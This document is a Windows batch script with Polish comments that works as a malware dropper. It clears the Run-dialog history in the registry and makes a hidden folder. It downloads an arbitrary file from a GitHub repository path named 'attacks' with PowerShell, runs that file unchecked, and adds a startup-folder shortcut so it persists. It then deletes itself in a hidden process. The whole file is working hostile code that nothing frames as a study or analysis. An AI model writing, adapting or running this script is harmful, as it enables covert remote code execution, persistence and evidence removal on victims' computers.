@echo off
REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f

setlocal

:: Pobierz nazwę pliku jako argument (np. update_v2.exe, script.py)
set FILE=%1

:: Folder docelowy (ukryty)
set DEST=%USERPROFILE%\Documents\.sysdata
if not exist "%DEST%" (
    mkdir "%DEST%"
    attrib +h "%DEST%"
)

:: Pobierz plik z internetu
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/petrohemia/attacks/refs/heads/main/%FILE%' -OutFile '%DEST%\%FILE%'"

:: Uruchom bez sprawdzania rozszerzenia
start "" "%DEST%\%FILE%"

:: Dodaj skrót do autostartu, jeśli jeszcze nie istnieje
set SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\launcher.lnk
if not exist "%SHORTCUT%" (
    powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%SHORTCUT%'); $Shortcut.TargetPath = '%~f0'; $Shortcut.Save()"
)

:: Wydziel samousuwanie do osobnego procesu, aby nie blokować pliku .bat
powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Remove-Item '%~f0' -Force" & exit
